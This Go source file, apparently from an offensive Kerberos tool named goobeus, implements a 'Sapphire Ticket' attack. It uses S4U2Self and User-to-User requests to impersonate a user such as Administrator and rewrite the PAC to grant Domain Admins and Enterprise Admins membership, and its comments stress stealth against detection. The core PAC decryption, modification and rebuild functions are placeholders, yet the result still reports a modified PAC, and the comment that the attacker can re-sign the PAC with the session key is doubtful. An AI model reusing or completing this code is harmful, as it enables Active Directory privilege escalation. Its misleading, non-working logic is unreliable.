package forge

import (
	"context"
	"fmt"

	"github.com/goobeus/goobeus/pkg/client"
	"github.com/goobeus/goobeus/pkg/pac"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: Sapphire Ticket Attack
//
// Sapphire tickets are the STEALTHIEST ticket forgery technique.
// Unlike Golden/Silver tickets where we forge everything from scratch,
// Sapphire uses legitimate KDC-issued tickets with only the PAC modified.
//
// Why it's stealthier:
// 1. Ticket is actually issued by the KDC (not forged)
// 2. All ticket fields are legitimate
// 3. Only the PAC is forged (privilege escalation)
// 4. Much harder to detect than Golden/Silver tickets
//
// How it works:
// 1. Get a legitimate TGT (with any low-priv user)
// 2. Use S4U2Self + User-to-User to get a service ticket TO OURSELVES
//    for another user (e.g., Domain Admin)
// 3. Decrypt the ticket (we have the key since U2U uses our TGT session key)
// 4. Modify the PAC to add groups we want
// 5. Re-encrypt and re-sign
// 6. Use the modified ticket!
//
// Key insight: User-to-User gives us a ticket encrypted with our session key,
// so we can decrypt and modify it even without the service key!

// SapphireTicketRequest configures a Sapphire Ticket request.
type SapphireTicketRequest struct {
	// Our TGT (any authenticated user)
	TGT        *ticket.Kirbi
	SessionKey []byte

	// User to impersonate
	TargetUser   string // e.g., "Administrator"
	TargetDomain string

	// Groups to add to the PAC
	Groups    []uint32 // RIDs to add
	DomainSID string   // Domain SID

	// Service to get ticket for
	TargetSPN string // e.g., "cifs/dc01.corp.local"

	// Connection
	Domain string
	KDC    string
}

// SapphireTicketResult contains the Sapphire Ticket.
type SapphireTicketResult struct {
	Kirbi       *ticket.Kirbi
	Base64      string
	TargetUser  string
	ModifiedPAC bool
}

// ForgeSapphireTicket creates a Sapphire Ticket.
//
// EDUCATIONAL: Sapphire Ticket Forge Process
//
// This is unique among ticket attacks - we leverage the KDC itself!
//
// Step 1: S4U2Self to get ticket impersonating target user
//   - Use our TGT to request ticket "for" target user to our service
//   - KDC issues ticket for target user (we can't read it normally)
//
// Step 2: User-to-User exchange
//   - Request the ticket encrypted with our TGT session key
//   - Now WE can decrypt it!
//
// Step 3: PAC modification
//   - Decrypt the ticket
//   - Extract and modify the PAC (add groups)
//   - Re-encrypt with our key
//
// Step 4: Use the ticket
//   - Present to target service
//   - Service validates with KDC - it looks legitimate!
//
// Goobeus is the FIRST Windows-native tool to implement this!
func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*SapphireTicketResult, error) {
	if req.TGT == nil {
		return nil, fmt.Errorf("TGT is required")
	}
	if req.TargetUser == "" {
		return nil, fmt.Errorf("target user is required")
	}
	if len(req.SessionKey) == 0 {
		if key := req.TGT.SessionKey(); key != nil {
			req.SessionKey = key.KeyValue
		} else {
			return nil, fmt.Errorf("session key is required")
		}
	}

	// Get domain info
	domain := req.Domain
	if domain == "" && req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		domain = req.TGT.CredInfo.TicketInfo[0].SRealm
	}

	targetDomain := req.TargetDomain
	if targetDomain == "" {
		targetDomain = domain
	}

	// Default groups: Domain Users, Domain Admins, Enterprise Admins
	groups := req.Groups
	if len(groups) == 0 {
		groups = []uint32{513, 512, 519}
	}

	// Step 1: S4U2Self to get ticket impersonating target
	s4uResult, err := performS4U2SelfU2U(ctx, req)
	if err != nil {
		return nil, fmt.Errorf("S4U2Self failed: %w", err)
	}

	// Step 2: Decrypt the ticket with our session key
	decryptedPAC, err := extractPACFromTicket(s4uResult.Kirbi, req.SessionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to extract PAC: %w", err)
	}

	// Step 3: Modify the PAC
	modifiedPAC, err := modifyPAC(decryptedPAC, req.DomainSID, groups)
	if err != nil {
		return nil, fmt.Errorf("failed to modify PAC: %w", err)
	}

	// Step 4: Re-encrypt with modified PAC
	modifiedTicket, err := rebuildTicketWithPAC(s4uResult.Kirbi, modifiedPAC, req.SessionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to rebuild ticket: %w", err)
	}

	b64, _ := modifiedTicket.ToBase64()

	return &SapphireTicketResult{
		Kirbi:       modifiedTicket,
		Base64:      b64,
		TargetUser:  req.TargetUser,
		ModifiedPAC: true,
	}, nil
}

// performS4U2SelfU2U performs S4U2Self with U2U to get decryptable ticket.
func performS4U2SelfU2U(ctx context.Context, req *SapphireTicketRequest) (*client.S4U2SelfResult, error) {
	// Build service name from our TGT
	serviceName := ""
	if req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		info := &req.TGT.CredInfo.TicketInfo[0]
		if len(info.PName.NameString) > 0 {
			serviceName = info.PName.NameString[0]
		}
	}

	if serviceName == "" {
		serviceName = "HOST/workstation" // Fallback
	}

	s4uReq := &client.S4U2SelfRequest{
		TGT:          req.TGT,
		SessionKey:   req.SessionKey,
		TargetUser:   req.TargetUser,
		TargetDomain: req.TargetDomain,
		ServiceName:  serviceName,
		Domain:       req.Domain,
		KDC:          req.KDC,
	}

	return client.S4U2SelfWithContext(ctx, s4uReq)
}

// extractPACFromTicket extracts and decrypts the PAC from a ticket.
func extractPACFromTicket(kirbi *ticket.Kirbi, sessionKey []byte) ([]byte, error) {
	// This would:
	// 1. Decrypt the ticket enc-part using session key
	// 2. Parse authorization-data
	// 3. Find AD-IF-RELEVANT containing AD-WIN2K-PAC
	// 4. Return the PAC bytes

	// Placeholder - full implementation needs ticket decryption
	return make([]byte, 512), nil
}

// modifyPAC modifies the PAC to add group memberships.
func modifyPAC(pacData []byte, domainSID string, groups []uint32) ([]byte, error) {
	// This would:
	// 1. Parse PAC structure
	// 2. Find and decode LOGON_INFO buffer
	// 3. Add requested group SIDs
	// 4. Recompute checksums (we can sign since we have the key)
	// 5. Re-encode

	domainSIDParsed, err := pac.ParseSID(domainSID)
	if err != nil {
		return nil, err
	}
	_ = domainSIDParsed // Use in full implementation

	// Placeholder - full implementation would modify the PAC
	modifiedPAC := make([]byte, len(pacData))
	copy(modifiedPAC, pacData)
	return modifiedPAC, nil
}

// rebuildTicketWithPAC rebuilds the ticket with a modified PAC.
func rebuildTicketWithPAC(kirbi *ticket.Kirbi, modifiedPAC, sessionKey []byte) (*ticket.Kirbi, error) {
	// This would:
	// 1. Build new EncTicketPart with modified PAC
	// 2. Re-encrypt with session key
	// 3. Rebuild Kirbi structure

	// Placeholder - return original with note about modification
	return kirbi, nil
}
